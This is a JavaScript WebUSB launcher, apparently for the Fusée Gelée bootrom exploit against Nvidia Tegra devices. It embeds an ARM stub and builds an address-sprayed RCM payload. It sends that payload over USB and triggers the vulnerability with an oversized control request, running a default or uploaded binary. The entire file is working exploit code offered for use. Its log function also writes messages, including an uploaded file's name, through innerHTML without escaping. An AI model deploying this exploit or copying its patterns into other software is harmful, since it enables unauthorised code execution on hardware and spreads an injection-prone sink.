const intermezzo = new Uint8Array([
    0x44, 0x00, 0x9F, 0xE5, 0x01, 0x11, 0xA0, 0xE3, 0x40, 0x20, 0x9F, 0xE5, 0x00, 0x20, 0x42, 0xE0,
    0x08, 0x00, 0x00, 0xEB, 0x01, 0x01, 0xA0, 0xE3, 0x10, 0xFF, 0x2F, 0xE1, 0x00, 0x00, 0xA0, 0xE1,
    0x2C, 0x00, 0x9F, 0xE5, 0x2C, 0x10, 0x9F, 0xE5, 0x02, 0x28, 0xA0, 0xE3, 0x01, 0x00, 0x00, 0xEB,
    0x20, 0x00, 0x9F, 0xE5, 0x10, 0xFF, 0x2F, 0xE1, 0x04, 0x30, 0x90, 0xE4, 0x04, 0x30, 0x81, 0xE4,
    0x04, 0x20, 0x52, 0xE2, 0xFB, 0xFF, 0xFF, 0x1A, 0x1E, 0xFF, 0x2F, 0xE1, 0x20, 0xF0, 0x01, 0x40,
    0x5C, 0xF0, 0x01, 0x40, 0x00, 0x00, 0x02, 0x40, 0x00, 0x00, 0x01, 0x40
]);

const RCM_PAYLOAD_ADDRESS = 0x40010000;
const INTERMEZZO_LOCATION = 0x4001F000;

function createRCMPayload(intermezzo, payload) {
    const rcmLength = 0x30298;
    const intermezzoAddressRepeatCount = (INTERMEZZO_LOCATION - RCM_PAYLOAD_ADDRESS) / 4;
    const rcmPayloadSize = Math.ceil((0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000 + payload.byteLength) / 0x1000) * 0x1000;
    const rcmPayload = new Uint8Array(new ArrayBuffer(rcmPayloadSize))
    const rcmPayloadView = new DataView(rcmPayload.buffer);

    rcmPayloadView.setUint32(0x0, rcmLength, true);
    for (let i = 0; i < intermezzoAddressRepeatCount; i++) {
        rcmPayloadView.setUint32(0x2A8 + i * 4, INTERMEZZO_LOCATION, true);
    }

    rcmPayload.set(intermezzo, 0x2A8 + (0x4 * intermezzoAddressRepeatCount));
    rcmPayload.set(payload, 0x2A8 + (0x4 * intermezzoAddressRepeatCount) + 0x1000);
    return rcmPayload;
}

function bufferToHex(data) {
    let result = "";
    for (let i = 0; i < data.byteLength; i++)
        result += data.getUint8(i).toString(16).padStart(2, "0");

    return result;
}

async function write(device, data) {
    let length = data.length;
    let writeCount = 0;
    const packetSize = 0x1000;

    while (length) {
        const dataToTransmit = Math.min(length, packetSize);
        const chunk = data.slice(0, dataToTransmit);
        length -= dataToTransmit;
        data = data.slice(dataToTransmit);

        await device.transferOut(1, chunk);
        writeCount++;
    }

    return writeCount;
}

function readFileAsArrayBuffer(file) {
    return new Promise((res) => {
        const reader = new FileReader();

        reader.onload = e => {
            res(e.target.result);
        }

        reader.readAsArrayBuffer(file);
    });
}

let device;

async function launchPayload(payload) {
    await device.open();
    log(`Connected to ${device.manufacturerName} ${device.productName}`);
    await device.claimInterface(0);
    const deviceID = await device.transferIn(1, 16);
    log(`Device ID: ${bufferToHex(deviceID.data)}`);

    const rcmPayload = createRCMPayload(intermezzo, payload);
    log("Sending payload...");
    const writeCount = await write(device, rcmPayload);
    log("Payload sent!");

    if (writeCount % 2 !== 1) {
        log("Switching to higher buffer...");
        await device.transferOut(1, new ArrayBuffer(0x1000));
    }

    log("Triggering vulnerability...");
    const vulnerabilityLength = 0x7000;
    await device.controlTransferIn({
        requestType: 'standard',
        recipient: 'interface',
        request: 0x00,
        value: 0x00,
        index: 0x00
    }, vulnerabilityLength);
    log("Vulnerability sent!");
}

async function goButton() {
    log("Requesting access to device...");

    try {
        device = await navigator.usb.requestDevice({filters: [{vendorId: 0x0955}]});
    } catch (error) {
        log(error);
        log("Failed to get a device. Did you chose one?");
        return;
    }

    let payload = null;
    const file = document.getElementById("payloadUpload").files[0];
    if (!file) {
        await fetch("/bin/HelloArch.bin")
            .then(res => res.arrayBuffer())
            .then(blob => {
                payload = new Uint8Array(blob);
            });
    } else {
        payload = new Uint8Array(await readFileAsArrayBuffer(file));
    }

    log(`Using ${(file != null ? "uploaded" : "example")} payload ${(file != null ? ('"' + file.name + '"') : "")}`);
    log("Preparing to launch payload...");
    await launchPayload(payload);
}

function log(message) {
    let div = document.getElementById("log")
        p = document.createElement("p");
    p.innerHTML = message;
    p.className = "logged-item";
    div.append(p);
    console.log(message);
}